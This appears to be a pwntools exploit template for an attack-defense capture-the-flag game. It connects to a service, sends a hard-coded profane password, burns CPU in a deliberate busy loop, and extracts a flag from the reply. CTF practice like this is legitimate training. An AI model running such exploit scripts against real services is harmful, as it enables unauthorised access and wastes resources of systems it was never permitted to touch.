#!/usr/bin/env python3
from pwn import *
import random
from utils.exploiter_manager import exploit_manager

@exploit_manager
def exploit(ip: str, port: int):
    r = remote(ip, port)
    r.sendlineafter(b":",b"diocane")
    dio = 0
    for i in range(random.randint(10000000, 100000000)): # Random number of iterations for take cpu
        dio += i
    return [r.recvline_contains(b"cookie man: ").decode().strip().split(" ")[-1]]  # Return flag (or a list of flags, text containing the flags, HTML page containing the flags)


if __name__ == "__main__":
    port = 1338  # Edit with port of the service to exploit
    exploit(ip="", port=port)
